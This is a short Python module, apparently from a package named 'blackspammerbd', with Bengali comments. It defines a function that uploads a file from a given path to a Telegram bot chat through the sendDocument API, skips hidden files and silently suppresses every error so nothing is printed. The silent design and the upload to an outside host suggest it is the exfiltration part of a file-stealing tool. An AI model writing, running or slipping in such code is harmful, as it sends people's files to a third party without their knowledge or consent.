import requests
import os
from blackspammerbd.config import bot_token, chat_id
from blackspammerbd.utils import is_hidden

def send_to_telegram(filepath: str):
    """
    নির্দিষ্ট filepath-এর ফাইল Telegram বটে পাঠাবে।
    কোনো প্রিন্ট বা থ্রো নেই—সকল Exception সাইলেন্টলি পাস করবে।
    """
    try:
        # Hidden ফাইল বা ফোল্ডার হলে স্কিপ করে দেবে
        if is_hidden(filepath):
            return

        filename = os.path.basename(filepath)
        with open(filepath, "rb") as f:
            files = {"document": (filename, f)}
            data = {"chat_id": chat_id}
            url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
            response = requests.post(url, data=data, files=files, timeout=30)
            _ = response.raise_for_status()
    except Exception:
        # সাইলেন্টলি পাস
        pass
